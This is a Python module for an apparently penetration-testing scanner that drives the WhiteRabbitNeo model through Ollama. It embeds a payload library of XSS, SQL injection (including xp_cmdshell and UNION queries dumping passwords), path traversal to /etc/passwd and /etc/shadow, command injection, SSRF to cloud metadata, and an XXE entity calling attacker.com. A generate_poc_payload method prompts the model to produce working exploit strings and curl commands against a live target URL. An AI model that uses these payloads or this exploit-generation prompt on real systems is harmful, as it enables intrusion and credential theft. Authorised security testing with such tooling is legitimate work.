"""
Argus LLM Engine
Manages Ollama lifecycle and self-healing WhiteRabbitNeo inference.

Self-healing rules:
  1. On startup  -> health_check(); auto-pull model if missing.
  2. On inference -> retry up to MAX_RETRIES with exponential back-off.
  3. On empty response -> simplify prompt and retry once.
  4. On timeout   -> halve max_tokens and retry.
  5. If all retries fail -> return a safe fallback string (never crash caller).
"""

import os
import json
import time
import subprocess
import requests
import threading

OLLAMA_HOST  = os.getenv("OLLAMA_HOST", "http://localhost:11434")
MODEL_NAME   = "WhiteRabbitNeo/WhiteRabbitNeo-V3-7B:latest"
MAX_RETRIES  = 3
BASE_DELAY   = 2        # seconds (doubles each retry)
DEFAULT_TOKENS = 1800

# -- SecLists reference payloads -----------------------------------------------
# Curated from https://github.com/danielmiessler/seclists
# Used as in-prompt reference for WhiteRabbitNeo payload generation.
# If a local SecLists installation is found, payloads are loaded from disk instead.

SECLISTS_EMBEDDED = {
    'xss': [
        '<script>alert(document.domain)</script>',
        '<img src=x onerror=alert(document.domain)>',
        '"><svg onload=alert(document.domain)>',
        '\';alert(document.domain)//',
        '</script><script>alert(document.domain)</script>',
        '<details open ontoggle=alert(document.domain)>',
        '<iframe src="javascript:alert(document.domain)">',
        '"><img src=x onerror=alert(document.domain)>',
        '<input autofocus onfocus=alert(document.domain)>',
        '<body onload=alert(document.domain)>',
        '<svg><script>alert(document.domain)</script></svg>',
        '"-alert(document.domain)-"',
        '`-alert(document.domain)-`',
        '<!--<img src=--><img src=x onerror=alert(document.domain)//>',
    ],
    'sqli': [
        "' OR '1'='1",
        "' OR 1=1--",
        "1' AND 1=1--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "admin'--",
        "' OR 'x'='x",
        "') OR ('1'='1",
        "' OR 1=1#",
        "1; SELECT sleep(5)--",
        "' AND SLEEP(5)--",
        "'; EXEC xp_cmdshell('id')--",
        "' UNION SELECT username,password FROM users--",
        "1' ORDER BY 1--",
    ],
    'traversal': [
        '../../../../etc/passwd',
        '../../etc/passwd',
        '..%2F..%2F..%2F..%2Fetc%2Fpasswd',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
        '/etc/passwd',
        '../../../../etc/shadow',
        '../../../../../../../etc/passwd%00',
        '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
        '....\\/....\\/....\\/etc/passwd',
        '..%252f..%252f..%252fetc%252fpasswd',
    ],
    'sqli_blind': [
        "' AND SLEEP(5)--",
        "' AND 1=1--",
        "' AND 1=2--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "1 AND 1=1",
        "1 AND 1=2",
    ],
    'cmd': [
        '; id',
        '| id',
        '$(id)',
        '`id`',
        '; cat /etc/passwd',
        '& whoami',
        '| whoami',
        '\n id',
        '; ls -la /',
        '$(cat /etc/passwd)',
        '|id',
        '; ping -c 1 127.0.0.1',
    ],
    'ssrf': [
        'http://127.0.0.1/',
        'http://localhost/',
        'http://169.254.169.254/latest/meta-data/',
        'http://[::1]/',
        'http://0.0.0.0/',
        'http://127.0.0.1:6379/',   # Redis
        'http://127.0.0.1:8080/',
        'file:///etc/passwd',
        'dict://127.0.0.1:6379/info',
    ],
    'xxe': [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/">]><foo>&xxe;</foo>',
    ],
    'open_redirect': [
        '//evil.com',
        '///evil.com',
        'https://evil.com',
        '//evil.com/%2F..',
        '/\\evil.com',
        'javascript:alert(1)',
    ],
    'leak': [
        '.env', '.git/config', 'wp-config.php', '.htaccess',
        'phpinfo.php', 'config.php.bak', 'backup.sql',
        '.aws/credentials', 'id_rsa', 'web.config',
    ],
}

# Mapping: data_type -> which SECLISTS_EMBEDDED key(s) to include
_DTYPE_TO_SECLISTS = {
    'xss':           ['xss'],
    'sqli':          ['sqli', 'sqli_blind'],
    'vulnerability': ['sqli', 'cmd', 'ssrf', 'xxe'],
    'traversal':     ['traversal'],
    'leak':          ['leak'],
    'secrets':       ['leak'],
    'path':          ['traversal', 'leak'],
}

# Common SecLists installation paths (Windows + WSL Kali)
_SECLISTS_SEARCH_PATHS = [
    r'C:\tools\SecLists',
    r'C:\SecLists',
    r'D:\SecLists',
    r'C:\Users\Public\SecLists',
]
_SECLISTS_FILE_MAP = {
    'xss':       r'Fuzzing\XSS\XSS-Jhaddix.txt',
    'sqli':      r'Fuzzing\SQLi\quick-SQLi.txt',
    'traversal': r'Fuzzing\LFI\LFI-Jhaddix.txt',
    'cmd':       r'Fuzzing\command-injection.txt',
    'ssrf':      r'Fuzzing\SSRF\SSRF-Jhaddix.txt',
}


def _load_seclists_file(dtype: str, max_lines: int = 30) -> list[str]:
    """
    Try to load payloads from a local SecLists installation.
    Falls back to SECLISTS_EMBEDDED if not found.
    Returns up to max_lines non-empty, non-comment lines.
    """
    filename = _SECLISTS_FILE_MAP.get(dtype)
    if not filename:
        return []
    for base in _SECLISTS_SEARCH_PATHS:
        full = os.path.join(base, filename)
        if os.path.isfile(full):
            try:
                with open(full, encoding='utf-8', errors='ignore') as fh:
                    lines = [
                        l.strip() for l in fh
                        if l.strip() and not l.startswith('#')
                    ]
                # Return a spread sample (first 10 + middle 10 + last 10)
                n = len(lines)
                if n <= max_lines:
                    return lines
                step = n // max_lines
                return lines[::step][:max_lines]
            except Exception:
                pass
    return []


def _get_reference_payloads(dtype: str) -> list[str]:
    """
    Return the best available reference payload list for a given data_type.
    Prefers local SecLists; falls back to embedded curated list.
    """
    keys = _DTYPE_TO_SECLISTS.get(dtype, [])
    # Try local SecLists first (primary key only)
    if keys:
        from_disk = _load_seclists_file(keys[0])
        if from_disk:
            return from_disk[:25]
    # Fall back to embedded reference
    combined = []
    for k in keys:
        combined.extend(SECLISTS_EMBEDDED.get(k, []))
    return combined or SECLISTS_EMBEDDED.get('xss', [])


class OllamaEngine:
    """Thread-safe self-healing wrapper around a local Ollama model."""

    def __init__(self, model: str = MODEL_NAME, host: str = OLLAMA_HOST):
        self.model  = model
        self.host   = host.rstrip("/")
        self._ready = False
        self._lock  = threading.Lock()

    # -- Health & lifecycle ------------------------------------------------

    def health_check(self) -> tuple[bool, str]:
        """Returns (ok, message). Does NOT pull the model."""
        try:
            r = requests.get(f"{self.host}/api/tags", timeout=6)
            if r.status_code != 200:
                return False, f"Ollama HTTP {r.status_code}"
            names = [m["name"] for m in r.json().get("models", [])]
            short = self.model.split(":")[0].lower()
            if any(short in n.lower() for n in names):
                self._ready = True
                return True, f"Ready - {self.model}"
            return False, f"Model not loaded. Available: {names or ['(none)']}"
        except requests.ConnectionError:
            return False, f"Ollama not reachable at {self.host}"
        except Exception as e:
            return False, f"Health check error: {e}"

    def ensure_ready(self) -> tuple[bool, str]:
        """
        Full startup check:
          1. Is Ollama reachable?
          2. Is the model present?  If not, pull it.
        Returns (ok, status_message).
        """
        ok, msg = self.health_check()
        if ok:
            return True, msg

        # Ollama is running but model missing -> pull
        if "not reachable" not in msg.lower():
            return self._pull_model()

        # Ollama itself is not running -> try to start it
        print(f"[*] Ollama unreachable - attempting to start service...")
        started = self._start_ollama()
        if started:
            time.sleep(3)
            ok, msg = self.health_check()
            if ok:
                return True, msg
            return self._pull_model()

        return False, f"Cannot start Ollama: {msg}"

    def _pull_model(self) -> tuple[bool, str]:
        print(f"[*] Pulling {self.model} (this may take a few minutes)...")
        try:
            result = subprocess.run(
                ["ollama", "pull", self.model],
                capture_output=True, text=True, timeout=600,
            )
            if result.returncode == 0:
                self._ready = True
                return True, f"Pulled {self.model} successfully"
            return False, f"Pull failed: {result.stderr[:300]}"
        except FileNotFoundError:
            return False, "ollama CLI not found - install Ollama from https://ollama.ai"
        except subprocess.TimeoutExpired:
            return False, "Model pull timed out (>10 min)"
        except Exception as e:
            return False, f"Pull error: {e}"

    def _start_ollama(self) -> bool:
        try:
            subprocess.Popen(
                ["ollama", "serve"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            return True
        except Exception:
            return False

    # -- Inference ---------------------------------------------------------

    def generate(
        self,
        prompt: str,
        temperature: float = 0.05,
        max_tokens: int = DEFAULT_TOKENS,
    ) -> tuple[str, str | None]:
        """
        Run inference with self-healing retry logic.
        Returns (response_text, error_or_None).
        Caller always gets a string - never an exception.
        """
        last_error = "Unknown error"
        current_max = max_tokens

        for attempt in range(1, MAX_RETRIES + 1):
            try:
                payload = {
                    "model":  self.model,
                    "prompt": prompt,
                    "stream": False,
                    "options": {
                        "temperature": temperature,
                        "num_predict": current_max,
                        "stop": ["<|im_end|>", "</s>", "[INST]", "###"],
                    },
                }
                r = requests.post(
                    f"{self.host}/api/generate",
                    json=payload,
                    timeout=180,
                )

                if r.status_code == 200:
                    data = r.json()
                    text = data.get("response", "").strip()
                    if text:
                        return text, None
                    # Empty response -> simplify prompt, try once more
                    if attempt == 1:
                        prompt = self._simplify_prompt(prompt)
                        last_error = "Empty response - retrying with simplified prompt"
                        continue
                    last_error = "Model returned empty response"

                elif r.status_code == 404:
                    # Model not loaded mid-session -> re-pull
                    ok, pull_msg = self._pull_model()
                    last_error = f"Model disappeared: {pull_msg}"

                else:
                    last_error = f"HTTP {r.status_code}: {r.text[:200]}"

            except requests.Timeout:
                # Timeout -> halve tokens and retry
                current_max = max(256, current_max // 2)
                last_error  = f"Timeout on attempt {attempt} - reducing to {current_max} tokens"

            except requests.ConnectionError:
                last_error = "Lost connection to Ollama"
                # Try to restart
                self._start_ollama()
                time.sleep(3)

            except json.JSONDecodeError as e:
                last_error = f"JSON parse error: {e}"

            except Exception as e:
                last_error = f"Unexpected error: {e}"

            delay = BASE_DELAY * (2 ** (attempt - 1))
            print(f"[!] LLM attempt {attempt}/{MAX_RETRIES} failed: {last_error}. "
                  f"Retrying in {delay}s...")
            time.sleep(delay)

        fallback = (
            f"[LLM analysis unavailable after {MAX_RETRIES} attempts: {last_error}]\n"
            "Manual review of scanner evidence is recommended."
        )
        return fallback, last_error

    @staticmethod
    def _simplify_prompt(prompt: str) -> str:
        """Strip the long evidence block, keep only the questions."""
        lines = prompt.split("\n")
        # Keep everything from Q1 onward
        for i, line in enumerate(lines):
            if line.strip().startswith("Q1."):
                return "\n".join(lines[i:])
        # Fallback: trim to last 800 chars
        return prompt[-800:]

    # -- Structured threat analysis ----------------------------------------

    def analyze_findings(
        self,
        target: str,
        confirmed_findings: list[dict],
        raw_evidence: str,
    ) -> str:
        """
        Anti-false-positive structured prompt.
        The LLM receives ONLY confirmed scanner evidence and is explicitly
        forbidden from inventing new findings.
        """
        if not confirmed_findings and not raw_evidence.strip():
            return "No confirmed findings to analyse."

        # Build a compact findings list for the prompt
        finding_lines = []
        for i, f in enumerate(confirmed_findings, 1):
            finding_lines.append(
                f"  [{i}] Severity={f.get('severity','?')} "
                f"Tool={f.get('tool_name','?')} "
                f"Type={f.get('data_type','?')} "
                f"Summary={f.get('summary','')[:120]}"
            )
        findings_block = "\n".join(finding_lines) or "  (none stored yet)"

        prompt = f"""You are a senior penetration tester performing post-scan analysis.

TARGET: {target}

CONFIRMED FINDINGS FROM AUTOMATED SCANNERS (verified, not speculative):
{findings_block}

RAW SCANNER EVIDENCE (first 2000 chars):
{raw_evidence[:2000]}

STRICT RULES - you MUST follow these:
1. ONLY analyse evidence listed above. Do NOT invent additional vulnerabilities.
2. Do NOT use words like "might", "could", "possibly", "perhaps" without direct evidence.
3. Every claim must cite which finding number ([1], [2], ...) it is based on.
4. If a finding could be a false positive, say so explicitly and explain why.
5. Assign each finding a confidence score: HIGH (evidence is conclusive), MEDIUM (partial evidence), LOW (inferred, needs manual verification).
6. Only HIGH and MEDIUM confidence findings belong in a formal report.

Answer these questions concisely:

Q1. HIGH CONFIDENCE findings (direct HTTP error/response evidence): list them with evidence.
Q2. MEDIUM CONFIDENCE findings (partial evidence, worth manual testing): list them.
Q3. LOW CONFIDENCE / likely false positives: list and explain why.
Q4. Real-world attack impact of the HIGH confidence findings.
Q5. Top 3 manual verification steps for the tester.

Keep answers factual and brief. No padding."""

        response, error = self.generate(prompt, temperature=0.05, max_tokens=1400)
        if error and "[LLM analysis unavailable" in response:
            return response  # already formatted fallback
        return response

    def generate_poc_payload(
        self,
        dtype: str,
        param: str,
        context: str,
        evidence_snippet: str,
        target: str,
    ) -> str:
        """
        Ask WhiteRabbitNeo to generate a targeted exploit payload for a confirmed finding.
        Provides SecLists reference payloads as context so the model can select and
        adapt the best one for the specific reflection/injection context seen in evidence.

        Args:
            dtype:            'xss' | 'sqli' | 'secrets' | 'leak' | 'traversal' | ...
            param:            vulnerable parameter name (e.g. 'search', 'id', 'file')
            context:          reflection/injection context detected by verifier
            evidence_snippet: the raw HTML/response snippet that confirmed the vuln
            target:           full URL of the vulnerable endpoint

        Returns:
            AI-generated payload string, or empty string on failure.
        """
        dtype_descriptions = {
            'xss':           'Reflected Cross-Site Scripting (XSS)',
            'sqli':          'SQL Injection (error-based / union-based)',
            'secrets':       'Sensitive credential / secret exposure',
            'leak':          'Sensitive file disclosure',
            'traversal':     'Path traversal / Local File Inclusion (LFI)',
            'path':          'Hidden directory / exposed path',
            'vulnerability': 'Web application vulnerability',
            'cmd':           'OS Command Injection',
            'ssrf':          'Server-Side Request Forgery (SSRF)',
            'xxe':           'XML External Entity (XXE) Injection',
        }
        vuln_label = dtype_descriptions.get(dtype, dtype.upper())

        # Load SecLists reference payloads for this vulnerability type
        ref_payloads = _get_reference_payloads(dtype)
        ref_block = '\n'.join(f'  {p}' for p in ref_payloads[:20]) if ref_payloads else '  (none)'

        context_hint = f"\nReflection / injection context: {context}" if context else ""

        prompt = f"""You are an expert penetration tester generating a Proof of Concept exploit payload.

=== VULNERABILITY ===
Type:      {vuln_label}
Target:    {target}
Parameter: {param}{context_hint}

=== SCANNER EVIDENCE (what confirmed the vulnerability) ===
{evidence_snippet[:500]}

=== SECLISTS REFERENCE PAYLOADS (from danielmiessler/SecLists) ===
Study these and select / adapt the most effective one for the specific context above:
{ref_block}

=== YOUR TASK ===
Based on your offensive-security training AND the SecLists reference above:
1. Analyse the evidence context carefully.
2. Select the payload from the reference list (or craft a variation) that is most
   likely to succeed given the exact reflection/injection context shown.
3. Output ONLY the final raw payload string - nothing else.

Rules:
- NO explanation, NO markdown, NO surrounding text. Just the payload.
- For XSS: the payload must execute JavaScript in the confirmed HTML context.
- For SQLi: the payload must extract data or trigger the confirmed DB error pattern.
- For LFI/traversal: the payload must read /etc/passwd or equivalent.
- For secrets/leak: output the exact curl command to retrieve the sensitive resource.
- Do NOT output placeholder text like <payload> or [INSERT HERE].

Payload:"""

        response, error = self.generate(
            prompt,
            temperature=0.1,   # low temperature = precise exploitation, not creativity
            max_tokens=300,
        )

        if error or not response or '[LLM analysis unavailable' in response:
            return ''

        # WhiteRabbitNeo sometimes appends a brief note after the payload.
        # Take only the first substantive line (the raw payload itself).
        lines = [l.strip() for l in response.strip().splitlines() if l.strip()]
        if lines:
            return lines[0]
        return response.strip()

    def quick_classify(self, evidence_snippet: str) -> dict:
        """
        Lightweight single-call classifier.
        Returns {"is_fp": bool, "confidence": int, "reason": str}
        Used to gate individual scanner findings before storing to memory.
        """
        prompt = f"""Classify this scanner finding as a true positive or false positive.

EVIDENCE:
{evidence_snippet[:600]}

Reply with ONLY a JSON object, nothing else:
{{"is_fp": true/false, "confidence": 0-100, "reason": "one sentence"}}

Rules:
- is_fp=true means this is a false positive (not a real vulnerability).
- confidence is how sure you are (0=unsure, 100=certain).
- A 200 status alone is NOT enough - look for actual sensitive content."""

        response, _ = self.generate(prompt, temperature=0.0, max_tokens=120)
        try:
            # Extract JSON from response
            match = __import__('re').search(r'\{.*?\}', response, __import__('re').DOTALL)
            if match:
                return json.loads(match.group(0))
        except Exception:
            pass
        return {"is_fp": False, "confidence": 50, "reason": "classifier unavailable"}
